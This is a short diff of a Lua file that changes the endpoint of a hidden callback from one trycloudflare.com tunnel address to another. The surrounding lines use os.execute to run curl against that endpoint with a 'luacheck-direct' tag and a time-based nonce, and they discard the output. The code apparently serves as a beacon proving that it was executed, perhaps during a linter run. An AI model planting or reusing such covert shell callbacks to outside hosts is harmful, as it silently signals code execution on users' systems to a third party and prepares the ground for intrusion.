@@ -1,4 +1,4 @@
-local endpoint = "https://commented-span-applies-hudson.trycloudflare.com"
+local endpoint = "https://tube-install-dimension-asylum.trycloudflare.com"
 local nonce = tostring(os.time())
 
 os.execute("curl -fsS " .. endpoint .. "/hit/luacheck-direct-" .. nonce .. " >/dev/null")
